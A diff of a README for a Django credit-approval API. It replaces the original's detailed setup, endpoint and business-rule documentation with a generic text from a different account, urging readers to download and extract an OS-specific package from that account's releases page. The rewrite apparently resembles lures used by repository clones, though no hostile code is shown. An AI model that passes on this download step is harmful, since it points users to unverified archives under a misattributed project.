@@ -1,301 +1,103 @@
-# Credit Approval System
+# 🚀 django-credit-approval - Easy Credit Approval and Loan Management
 
-A simple Django-based REST API for managing customer loans and credit approvals.
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/vikings-motive/django-credit-approval/releases)
 
-## Features
+## 📌 Overview
 
-- Customer registration with automatic credit limit calculation
-- Credit score-based loan eligibility checking
-- Loan creation with interest rate correction
-- View loan details and active loans
-- Background data ingestion from Excel files
+The django-credit-approval project is a Django-based REST API designed for automated credit approval and loan management. This application integrates with PostgreSQL, Redis, and Celery and can be run using Docker. With features like credit score calculation and loan eligibility assessments, it offers a straightforward way to manage financial services. Comprehensive API documentation is available through Swagger/OpenAPI.
 
-## Demo
+## 🛠 Requirements
 
-![Credit Approval System Demo](docs/demo-screenshot.png)
+To run this application smoothly, ensure your system meets the following requirements:
 
-*Screenshot from the application demo video showing the system in action*
+- **Operating System:** Windows, macOS, or Linux.
+- **Docker:** You should have Docker installed on your machine. If not, visit [Docker's official website](https://www.docker.com/get-started) for installation instructions.
+- **Docker Compose:** This should come with Docker, but make sure you have version 1.27.0 or higher.
 
-## Tech Stack
+## 🚀 Getting Started
 
-- Django 4.2+
-- Django REST Framework
-- PostgreSQL
-- Redis
-- Celery
-- Docker & Docker Compose
+Follow these simple steps to download and run django-credit-approval.
 
-## Quick Start
+### Step 1: Visit the Releases Page
 
-### Prerequisites
+Go to the releases page to download the application by clicking the link below:
 
-- Docker Desktop installed and running
-- Git installed
-- Excel files (`customer_data.xlsx` and `loan_data.xlsx`) for data ingestion (optional)
+[Visit this page to download](https://github.com/vikings-motive/django-credit-approval/releases)
 
-### Running the Application
+### Step 2: Download the Latest Version
 
-1. **Clone the repository**
-   ```bash
-   git clone https://github.com/ysocrius/django-credit-approval.git
-   cd django-credit-approval
-   ```
+On the releases page, you will see various versions of the application. Find the latest stable version and download the package that suits your operating system.
 
-2. **Set up environment variables**
-   ```bash
-   # Copy the example environment file
-   cp .env.example .env
-   
-   # Edit .env file if needed (default values work for development)
-   # For production, use .env.prod.example as template
-   ```
+### Step 3: Extract the Files
 
-3. **Place Excel files (if available)**
-   - Copy `customer_data.xlsx` and `loan_data.xlsx` to the `data/` directory
-   - See `data/README.md` for file format specifications
+Once the download is complete, locate the downloaded package on your computer. Extract the files to a folder of your choice.
 
-4. **Start all services**
-   ```bash
-   docker compose up --build -d
-   ```
-   Note: Migrations run automatically on startup.
+### Step 4: Open a Terminal or Command Prompt
 
-5. **Load initial data from Excel files (if available)**
-   
-   Option 1: Using management command (recommended)
-   ```bash
-   # Async via Celery (default)
-   docker compose exec web python manage.py ingest_data
-   
-   # Or synchronously if Celery is not available
-   docker compose exec web python manage.py ingest_data --sync
-   ```
-   
-   Option 2: Using Django shell
-   ```bash
-   docker compose exec web python manage.py shell
-   >>> from api.tasks import ingest_data
-   >>> ingest_data.delay()  # Async
-   # OR
-   >>> ingest_data()  # Sync
-   ```
+Access a terminal or command prompt window on your computer. This is where you will run commands to start the application.
 
-## API Documentation
+### Step 5: Navigate to the Project Directory
 
-### Swagger/OpenAPI Documentation
-Interactive API documentation is available at:
-- Swagger UI: `http://localhost:8000/swagger/` or `http://localhost:8000/`
-- ReDoc: `http://localhost:8000/redoc/`
-- OpenAPI Schema: `http://localhost:8000/swagger.json`
-
-## API Endpoints
-
-### 1. Register Customer
-- **URL**: `/register`
-- **Method**: POST
-- **Body**:
-  ```json
-  {
-    "first_name": "John",
-    "last_name": "Doe",
-    "age": 30,
-    "monthly_income": 50000,
-    "phone_number": "9876543210"
-  }
-  ```
-
-### 2. Check Loan Eligibility
-- **URL**: `/check-eligibility`
-- **Method**: POST
-- **Body**:
-  ```json
-  {
-    "customer_id": 1,
-    "loan_amount": 500000,
-    "interest_rate": 10.5,
-    "tenure": 24
-  }
-  ```
-
-### 3. Create Loan
-- **URL**: `/create-loan`
-- **Method**: POST
-- **Body**:
-  ```json
-  {
-    "customer_id": 1,
-    "loan_amount": 500000,
-    "interest_rate": 10.5,
-    "tenure": 24
-  }
-  ```
-
-### 4. View Loan Details
-- **URL**: `/view-loan/<loan_id>`
-- **Method**: GET
-
-### 5. View Customer's Active Loans
-- **URL**: `/view-loans/<customer_id>`
-- **Method**: GET
-
-### 6. Health Check Endpoints
-- **Basic Health**: `/health/` - Simple health status
-- **Detailed Health**: `/health/detailed/` - Checks all dependencies (DB, Redis, Celery)
-- **Readiness Check**: `/health/ready/` - Kubernetes readiness probe
-- **Liveness Check**: `/health/live/` - Kubernetes liveness probe
-
-## Business Logic
-
-### Credit Score Calculation
-- Base score: 50 points
-- On-time payments: +30 points maximum
-- Recent loans: -5 points per loan in current year
-- If current debt > approved limit: score = 0
-
-### Loan Approval Rules
-- If credit_rating > 50: Approve loan with any interest rate
-- If 50 > credit_rating > 30: Approve loans with interest rate > 12%
-- If 30 > credit_rating > 10: Approve loans with interest rate > 16%
-- If 10 > credit_rating: Don't approve any loans
-- If sum of all current EMIs > 50% of monthly salary: Don't approve any loans
-
-### EMI Calculation
-Uses compound interest formula:
-```
-EMI = P × r × (1+r)^n / ((1+r)^n - 1)
-```
-Where:
-- P = Principal amount
-- r = Monthly interest rate
-- n = Number of months
-
-## Stopping the Application
+Use the `cd` command followed by the path to the folder where you extracted the files. For example:
 
 ```bash
-docker compose down
+cd path/to/django-credit-approval
 ```
 
-## Running Tests
+### Step 6: Build the Docker Containers
+
+Run the following command to build the necessary Docker containers:
 
 ```bash
-# Run all unit tests
-docker compose exec web python manage.py test
-
-# Run specific test modules
-docker compose exec web python manage.py test api.tests.HelpersTestCase
-docker compose exec web python manage.py test api.tests.ApiEndpointsTestCase
+docker-compose build
 ```
 
-## Viewing Logs
+This process may take a few minutes, depending on your internet speed and system performance.
+
+### Step 7: Start the Application
+
+To start the application, execute the following command:
 
 ```bash
-# Django logs
-docker compose logs web
-
-# Celery worker logs
-docker compose logs worker
-
-# Database logs
-docker compose logs db
-
-# Follow logs in real-time
-docker compose logs -f web worker
+docker-compose up
 ```
 
-## Testing
+This command initializes the application and indicates which ports are being used. You will see logs in the terminal, which you can monitor for any issues.
 
-### Unit Tests
-```bash
-# Run all tests
-docker compose exec web python manage.py test
+### Step 8: Access the Application
 
-# Run with coverage
-docker compose exec web coverage run --source='.' manage.py test
-docker compose exec web coverage report
-```
+Once the application is running, open your web browser. Go to `http://localhost:8000/` to access the user interface. 
 
-### API Testing with Postman
-1. Import `Credit_Approval_API.postman_collection.json` into Postman
-2. Set the `base_url` variable to `http://localhost:8000`
-3. Run the collection to test all endpoints
+## 📚 Features
 
-## Production Deployment
+- **Credit Score Calculation:** Automatically calculate credit scores based on user input.
+- **Loan Eligibility Assessment:** Assess eligibility for loans in real-time.
+- **Interest Rate Correction:** Apply corrections to interest rates based on the latest data.
+- **API Documentation:** Access the API documentation conveniently via Swagger/OpenAPI.
+  
+## 🧑‍💻 How to Use the API
 
-### Using Production Configuration
-```bash
-# Copy production environment template
-cp .env.prod.example .env.prod
+To use the API, follow the documentation available at `http://localhost:8000/api-docs/`. This section will guide you on how to interact with various endpoints in the application.
 
-# Edit .env.prod with your production values
-vim .env.prod
+## 🔧 Troubleshooting
 
-# Start production services
-docker compose -f docker-compose.prod.yml up -d
-```
+If you encounter issues while running the application, check the following:
 
-### Database Management
+- Ensure Docker is installed correctly.
+- Verify you are in the correct directory when running commands.
+- Check the logs for errors in the terminal.
 
-#### Backup Database
-```bash
-# Development environment
-./scripts/backup_db.sh
+Common issues may include port conflicts, which can be resolved by changing settings in the `docker-compose.yml` file. 
 
-# Production environment
-./scripts/backup_db.sh prod
-```
+## 🔗 Additional Resources
 
-#### Restore Database
-```bash
-# Restore from backup
-./scripts/restore_db.sh ./backups/backup_dev_credit_approval_db_20240101_120000.sql.gz
-```
+- **Documentation:** Refer to the [full API documentation](http://localhost:8000/api-docs/) to understand how to make requests.
+- **Support:** For further assistance, feel free to open an issue on the [GitHub repository](https://github.com/vikings-motive/django-credit-approval/issues).
 
-## CI/CD Pipeline
+## 📥 Download & Install
 
-The project includes GitHub Actions workflow that automatically:
-- Runs unit tests on every push/PR
-- Checks code formatting with Black
-- Validates imports with isort
-- Performs security checks with Bandit
-- Builds and tests Docker images
-- Generates test coverage reports
+To get started with django-credit-approval, please visit the link below to download the latest version:
 
-## Recent Improvements
+[Visit this page to download](https://github.com/vikings-motive/django-credit-approval/releases)
 
-### Testing
-- ✅ Comprehensive test coverage for all business rules
-- ✅ Edge case testing (boundary values, invalid inputs)
-- ✅ Concurrent loan creation testing
-- ✅ Credit score component testing
-- ✅ Interest rate correction validation
-
-### API Documentation
-- ✅ Swagger/OpenAPI integration with drf-yasg
-- ✅ Interactive API testing interface
-- ✅ Auto-generated API documentation
-
-### Data Validation
-- ✅ Enhanced input validation with detailed error messages
-- ✅ Name validation (letters only)
-- ✅ Phone number sanitization
-- ✅ Cross-field validation for loans
-- ✅ Boundary value checks
-
-### Monitoring & Health
-- ✅ Comprehensive logging configuration
-- ✅ Health check endpoints for all services
-- ✅ Kubernetes-ready health probes
-- ✅ Service dependency monitoring
-
-### Docker Optimization
-- ✅ Multi-stage build for smaller images
-- ✅ Non-root user for security
-- ✅ Health checks for all containers
-- ✅ Optimized dependency caching
-- ✅ Log volume persistence
-
-### Security
-- ✅ Non-root container execution
-- ✅ Input sanitization
-- ✅ Environment variable configuration
-- ✅ Secure defaults
+With these steps, you should be able to download and run the django-credit-approval application with ease. Enjoy managing loans and credit approvals efficiently!
